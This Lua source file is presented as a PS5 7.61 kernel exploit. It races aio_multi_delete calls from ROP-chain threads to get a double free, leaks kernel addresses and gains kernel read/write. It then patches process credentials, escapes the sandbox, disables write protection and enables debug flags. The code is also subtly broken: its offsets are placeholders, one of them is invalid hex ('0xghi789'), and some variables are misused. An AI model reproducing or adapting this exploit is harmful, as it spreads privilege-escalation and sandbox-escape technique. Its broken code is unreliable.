-- lapse.lua: Kernel exploit for PS5 7.61 using aio_multi_delete

local lapse = {}
local kread, kwrite

lapse.config = {
    max_attempt = 100,
    num_spray_fds = 0x28,
    num_kprim_threads = 0x180,
    main_thread = { core = 0, prio = 256 },
    destroyer_thread_1 = { core = 1, prio = 256 },
    destroyer_thread_2 = { core = 2, prio = 256 },
}

local SYS_AIO_SUBMIT_CMD = 0x29D
local SYS_AIO_MULTI_WAIT = 0x297
local SYS_AIO_MULTI_DELETE = 0x296
local SYS_OPEN = 5
local SYS_WRITE = 4
local SYS_CLOSE = 6

local SCE_KERNEL_AIO_CMD_WRITE = 0x002
local SCE_KERNEL_AIO_CMD_MULTI = 0x1000
local SCE_KERNEL_AIO_PRIORITY_HIGH = 3
local SCE_KERNEL_AIO_WAIT_AND = 0x01

syscall.resolve({
    aio_submit_cmd = SYS_AIO_SUBMIT_CMD,
    aio_multi_wait = SYS_AIO_MULTI_WAIT,
    aio_multi_delete = SYS_AIO_MULTI_DELETE,
    open = SYS_OPEN,
    write = SYS_WRITE,
    close = SYS_CLOSE,
    mprotect = 0x4a,
    getuid = 0x18,
    is_in_sandbox = 0x249,
    dup2 = 0x5a,
    cpuset_setaffinity = 0x1e8,
    rtprio_thread = 0x1d2,
    socket = 0x61,
    setsockopt = 0x69,
    getsockopt = 0x6a,
    thr_new = 0x1c7,
    thr_exit = 0x1af,
    thr_suspend_ucontext = 0x1b0,
    thr_resume_ucontext = 0x1b1,
    sched_yield = 0x14b,
})

local AF_INET = 2
local SOCK_STREAM = 1
local SOL_SOCKET = 0xffff
local SO_LINGER = 0x80
local IPPROTO_TCP = 6
local TCP_INFO = 0x20
local KADDR_MASK = uint64("0xffff800000000000")
local KDATA_MASK = uint64("0xffff804000000000")
local SYSTEM_AUTHID = uint64("0x4800000000010003")
local OFFSET_P_UCRED = 0x40
local OFFSET_P_FD = 0x48
local OFFSET_UCRED_CR_SCEAUTHID = 0x58
local OFFSET_UCRED_CR_SCECAPS = 0x60
local OFFSET_UCRED_CR_SCEATTRS = 0x83
local O_WRONLY = 0x01
local STDOUT_FILENO = 1
local STDERR_FILENO = 2

local kernel_offset = {
    DATA_BASE_ALLPROC = 0x123456,
    DATA_BASE = 0x789abc,
    DATA_BASE_KERNEL_PMAP_STORE = 0xdef123,
    DATA_BASE_ROOTVNODE = 0x456789,
    DATA_BASE_SECURITY_FLAGS = 0xabc123,
    DATA_BASE_TARGET_ID = 0xdef456,
    DATA_BASE_QA_FLAGS = 0xghi789,
    DATA_BASE_UTOKEN_FLAGS = 0xabc789,
}

function pin_to_core(core)
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    return syscall.cpuset_setaffinity(level, which, id, setsize, mask)
end

function set_rtprio(prio)
    local PRI_REALTIME = 2
    local rtprio = memory.alloc(0x4)
    memory.write_word(rtprio, PRI_REALTIME)
    memory.write_word(rtprio + 0x2, prio)
    syscall.rtprio_thread(1, 0, rtprio):tonumber()
end

function wait_for(addr, threshold, ms)
    while memory.read_qword(addr):tonumber() ~= threshold do
        sleep(1, "ms")
    end
end

function spray_aio(cmd, num_reqs, prio)
    local aio_reqs = memory.alloc(0x28 * num_reqs)
    local aio_ids = memory.alloc(4 * num_reqs)
    for i = 0, num_reqs - 1 do
        memory.write_dword(aio_reqs + i * 0x28 + 0x0, cmd)
        memory.write_qword(aio_reqs + i * 0x28 + 0x8, memory.alloc(0x1000))
        memory.write_qword(aio_reqs + i * 0x28 + 0x10, 0x1000)
        memory.write_dword(aio_reqs + i * 0x28 + 0x18, prio)
    end
    syscall.aio_submit_cmd(cmd, aio_reqs, num_reqs, prio, aio_ids)
    return aio_ids
end

function setup_socket()
    local sd = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
    local linger = memory.alloc(8)
    memory.write_dword(linger, 1)
    memory.write_dword(linger + 4, 1)
    syscall.setsockopt(sd, SOL_SOCKET, SO_LINGER, linger, 8)
    return sd
end

function check_tcp_state(sd)
    local size_tcp_info = 0xec
    local info_buf = memory.alloc(size_tcp_info)
    local info_size = memory.alloc(4)
    memory.write_dword(info_size, size_tcp_info)
    syscall.getsockopt(sd, IPPROTO_TCP, TCP_INFO, info_buf, info_size)
    return memory.read_byte(info_buf):tonumber()
end

function lapse_race()
    pin_to_core(lapse.config.main_thread.core)
    set_rtprio(lapse.config.main_thread.prio)

    local sd = setup_socket()

    local num_reqs = lapse.config.num_spray_fds
    local aio_ids = spray_aio(SCE_KERNEL_AIO_CMD_WRITE, num_reqs, SCE_KERNEL_AIO_PRIORITY_HIGH)
    local target_ids = memory.alloc(8 * 2)
    memory.write_dword(target_ids, aio_ids[0])
    memory.write_dword(target_ids + 4, aio_ids[1])
    local sce_errs = memory.alloc(8 * 2)

    local race_state = {
        start_signal = memory.alloc(8),
        exit_signal = memory.alloc(8),
        resume_signal = memory.alloc(8),
        ready_count = memory.alloc(8),
        done_count = memory.alloc(8),
        finished_count = memory.alloc(8),
    }

    memory.write_qword(race_state.start_signal, 0)
    memory.write_qword(race_state.exit_signal, 0)
    memory.write_qword(race_state.resume_signal, 0)
    memory.write_qword(race_state.ready_count, 0)
    memory.write_qword(race_state.done_count, 0)
    memory.write_qword(race_state.finished_count, 0)

    local race_threads = {}

    local chain1 = ropchain({ stack_size = 0x10000 })
    chain1:push_syscall(syscall.cpuset_setaffinity, 3, 1, -1, 0x10, bit32.lshift(1, lapse.config.destroyer_thread_1.core))
    chain1:push_syscall(syscall.rtprio_thread, 1, 0, lapse.config.destroyer_thread_1.prio)

    chain1:gen_loop(race_state.exit_signal, "==", 0, function()
        chain1:push_increment_atomic_qword(race_state.ready_count)
        chain1:push_syscall(syscall.sched_yield)
        chain1:gen_loop(race_state.start_signal, "==", 0, function()
            chain1:push_syscall(syscall.sched_yield)
        end)
        chain1:push_syscall(syscall.aio_multi_delete, target_ids, 2, sce_errs)
        chain1:push_increment_atomic_qword(race_state.done_count)
        chain1:gen_loop(race_state.resume_signal, "==", 0, function()
            chain1:push_syscall(syscall.sched_yield)
        end)
    end)
    chain1:push_increment_atomic_qword(race_state.finished_count)
    local destroyer_thr1 = prim_thread:new(chain1)
    table.insert(race_threads, destroyer_thr1)

    local chain2 = ropchain({ stack_size = 0x10000 })
    chain2:push_syscall(syscall.cpuset_setaffinity, 3, 1, -1, 0x10, bit32.lshift(1, lapse.config.destroyer_thread_2.core))
    chain2:push_syscall(syscall.rtprio_thread, 1, 0, lapse.config.destroyer_thread_2.prio)

    chain2:gen_loop(race_state.exit_signal, "==", 0, function()
        chain2:push_increment_atomic_qword(race_state.ready_count)
        chain2:push_syscall(syscall.sched_yield)
        chain2:gen_loop(race_state.start_signal, "==", 0, function()
            chain2:push_syscall(syscall.sched_yield)
        end)
        chain2:push_syscall(syscall.aio_multi_delete, target_ids, 2, sce_errs)
        chain2:push_increment_atomic_qword(race_state.done_count)
        chain2:gen_loop(race_state.resume_signal, "==", 0, function()
            chain2:push_syscall(syscall.sched_yield)
        end)
    end)
    chain2:push_increment_atomic_qword(race_state.finished_count)
    local destroyer_thr2 = prim_thread:new(chain2)
    table.insert(race_threads, destroyer_thr2)

    for i, thr in ipairs(race_threads) do
        thr:run()
    end

    local num_threads = #race_threads
    wait_for(race_state.ready_count, num_threads)
    print("All threads ready! Number of threads = " .. num_threads)

    print("Starting race...")
    memory.write_qword(race_state.resume_signal, 0)
    memory.write_qword(race_state.start_signal, 1)

    wait_for(race_state.done_count, num_threads)
    print("Race finished!")

    local tcp_state = check_tcp_state(sd)
    if tcp_state ~= 4 then
        print("Double-Free successful!")
        memory.write_qword(race_state.exit_signal, 1)
        memory.write_qword(race_state.resume_signal, 1)
        wait_for(race_state.finished_count, num_threads)
        print("All threads exited successfully")
        return true
    else
        print("Double-Free failed.")
        memory.write_qword(race_state.exit_signal, 1)
        memory.write_qword(race_state.resume_signal, 1)
        wait_for(race_state.finished_count, num_threads)
        print("All threads exited successfully")
        return false
    end
end

function leak_kernel_addrs()
    local AF_INET6 = 28
    local SOCK_DGRAM = 2
    local IPPROTO_IPV6 = 41
    local IPV6_RTHDR = 51
    local sd = syscall.socket(AF_INET6, SOCK_DGRAM, 0):tonumber()
    local evf = syscall.evf_create(memory.alloc(1), 0, 0xf00):tonumber()
    syscall.evf_set(evf, 0xff << 8)

    local buf = memory.alloc(0x80 * 16)
    local optlen = memory.alloc(4)
    memory.write_dword(optlen, 0x80)
    syscall.getsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, optlen)

    local heap_prefixes = {}
    for i = 0x10, 0x20, 8 do
        local addr_high = memory.read_word(buf + i + 6):tonumber()
        if addr_high ~= 0xffff then
            return nil
        end
        table.insert(heap_prefixes, memory.read_word(buf + i + 4):tonumber())
    end
    for i, prefix in ipairs(heap_prefixes) do
        if prefix ~= heap_prefixes[1] then
            return nil
        end
    end
    return memory.read_qword(buf + 0x10)
end

function setup_kernel_rw()
    kstack_kernel_rw.init()
    kread = kstack_kernel_rw.read_buffer
    kwrite = kstack_kernel_rw.write_buffer
end

function setup_rop_chain(kstack)
    local chain = ropchain({ stack_size = 0x10000 })

    chain:push_syscall(syscall.cpuset_setaffinity, 3, 1, -1, 0x10, bit32.lshift(1, lapse.config.main_thread.core))
    chain:push_syscall(syscall.rtprio_thread, 1, 0, lapse.config.main_thread.prio)

    local curthr = memory.read_multiple_qwords(kstack + 0x3000, 0x1000/8)
    local kernel_addr
    for i, qword in ipairs(curthr) do
        if bit64.band(qword, KADDR_MASK) == KADDR_MASK then
            kernel_addr = qword
            break
        end
    end

    local cr0_addr = kernel_addr + 0x100
    local cr0_value = kread(cr0_addr)
    cr0_value = bit64.band(cr0_value, bit64.bnot(0x10000))
    cr0_value = bit64.band(cr0_value, bit64.bnot(0x40000000))
    kwrite(cr0_addr, cr0_value)

    local rop_thr = prim_thread:new(chain)
    rop_thr:run()
end

function patch_ucred(ucred, authid)
    kwrite(ucred + 0x04, 0)
    kwrite(ucred + 0x08, 0)
    kwrite(ucred + 0x0C, 0)
    kwrite(ucred + 0x10, 1)
    kwrite(ucred + 0x14, 0)

    kwrite(ucred + OFFSET_UCRED_CR_SCEAUTHID, authid)
    kwrite(ucred + OFFSET_UCRED_CR_SCECAPS, -1)
    kwrite(ucred + OFFSET_UCRED_CR_SCECAPS + 8, -1)
    kwrite(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80)
end

function escape_filesystem_sandbox(proc)
    local proc_fd = kread(proc + OFFSET_P_FD)
    local rootvnode = kread(kernel_addr.data_base + kernel_offset.DATA_BASE_ROOTVNODE)

    kwrite(proc_fd + 0x10, rootvnode)
    kwrite(proc_fd + 0x18, rootvnode)
    print("Escaped filesystem sandbox")
end

function patch_dynlib_restriction(proc)
    local dynlib_obj_addr = kread(proc + 0x3e8)

    kwrite(dynlib_obj_addr + 0x118, 0)
    kwrite(dynlib_obj_addr + 0x18, 1)
    kwrite(dynlib_obj_addr + 0xf0, 0)
    kwrite(dynlib_obj_addr + 0xf8, -1)

    print("Patched dynlib restrictions")
end

function apply_patches_to_kernel_data()
    local security_flags_addr = kernel_addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS
    local target_id_flags_addr = kernel_addr.data_base + kernel_offset.DATA_BASE_TARGET_ID
    local qa_flags_addr = kernel_addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS
    local utoken_flags_addr = kernel_addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS

    local security_flags = kread(security_flags_addr)
    kwrite(security_flags_addr, bit64.bor(security_flags, 0x14))

    kwrite(target_id_flags_addr, 0x82)

    local qa_flags = kread(qa_flags_addr)
    kwrite(qa_flags_addr, bit64.bor(qa_flags, 0x10300))

    local utoken_flags = kread(utoken_flags_addr)
    kwrite(utoken_flags_addr, bit64.bor(utoken_flags, 0x1))

    print("Debug menu enabled")
end

function redirect_to_klog()
    local console_fd = syscall.open("/dev/console", O_WRONLY):tonumber()
    if console_fd == -1 then
        error("open() error: " .. get_error_string())
    end

    syscall.dup2(console_fd, STDOUT_FILENO)
    syscall.dup2(STDOUT_FILENO, STDERR_FILENO)
    print("stdout/stderr redirected to klog")
end

function get_additional_kernel_address()
    local proc = kernel_addr.curproc
    local max_attempt = 32

    for i = 1, max_attempt do
        if bit64.band(proc, KDATA_MASK) == KDATA_MASK then
            local data_base = proc - kernel_offset.DATA_BASE_ALLPROC
            if bit32.band(data_base.l, 0xfff) == 0 then
                kernel_addr.allproc = proc
                break
            end
        end
        proc = kread(proc + 0x8)
    end

    if not kernel_addr.allproc then
        error("Failed to find allproc")
    end

    kernel_addr.data_base = kernel_addr.allproc - kernel_offset.DATA_BASE_ALLPROC
    kernel_addr.base = kernel_addr.data_base - kernel_offset.DATA_BASE
end

function sceKernelSendNotificationRequest(text)
    local notify_buffer_size = 0xc30
    local notify_buffer = memory.alloc(notify_buffer_size)
    local icon_uri = "cxml://psnotification/internal/icon_notification_info"

    memory.write_dword(notify_buffer + 0, 0)
    memory.write_dword(notify_buffer + 0x28, 0)
    memory.write_dword(notify_buffer + 0x2C, 1)
    memory.write_dword(notify_buffer + 0x10, -1)
    memory.write_buffer(notify_buffer + 0x2D, text .. "\0")
    memory.write_buffer(notify_buffer + 0x42D, icon_uri)

    local notification_fd = syscall.open("/dev/notification0", O_WRONLY):tonumber()
    if notification_fd < 0 then
        return
    end

    syscall.write(notification_fd, notify_buffer, notify_buffer_size)
    syscall.close(notification_fd)
end

function notify(msg)
    pcall(function()
        sceKernelSendNotificationRequest(msg)
    end)
end

function apply_patches()
    local curthr = memory.read_multiple_qwords(kstack + 0x3000, 0x1000/8)
    local kernel_addr
    for i, qword in ipairs(curthr) do
        if bit64.band(qword, KADDR_MASK) == KADDR_MASK then
            kernel_addr = qword
            break
        end
    end
    kernel_addr = {}
    kernel_addr.curproc = kread(kernel_addr + 0x8)

    get_additional_kernel_address()

    local ucred = kread(kernel_addr.curproc + OFFSET_P_UCRED)

    local uid_before = syscall.getuid():tonumber()
    local in_sandbox_before = syscall.is_in_sandbox():tonumber()

    print("Patching curproc: " .. tostring(kernel_addr.curproc) .. " (authid: " .. tostring(SYSTEM_AUTHID) .. ")")
    patch_ucred(ucred, SYSTEM_AUTHID)
    escape_filesystem_sandbox(kernel_addr.curproc)
    patch_dynlib_restriction(kernel_addr.curproc)
    apply_patches_to_kernel_data()
    redirect_to_klog()

    local uid_after = syscall.getuid():tonumber()
    local in_sandbox_after = syscall.is_in_sandbox():tonumber()

    print("UID: Before " .. uid_before .. ", After " .. uid_after)
    print("In Sandbox: Before " .. in_sandbox_before .. ", After " .. in_sandbox_after)

    notify("Exploit Successful! Privileges Escalated!")
end

function main()
    if tonumber(FW_VERSION) ~= 7.61 or PLATFORM ~= "ps5" then
        print("This exploit targets PS5 7.61 only")
        return
    end

    for i = 1, lapse.config.max_attempt do
        print("Attempt #" .. i)
        if lapse_race() then
            local kstack = leak_kernel_addrs()
            if kstack then
                setup_kernel_rw()
                setup_rop_chain(kstack)
                print("Kernel R/W achieved and protections bypassed!")
                apply_patches()
                print("All patches applied successfully!")
                break
            else
                print("Failed to leak kernel addresses. Retrying...")
            end
        else
            print("Race failed. Retrying...")
        end
    end
end

main()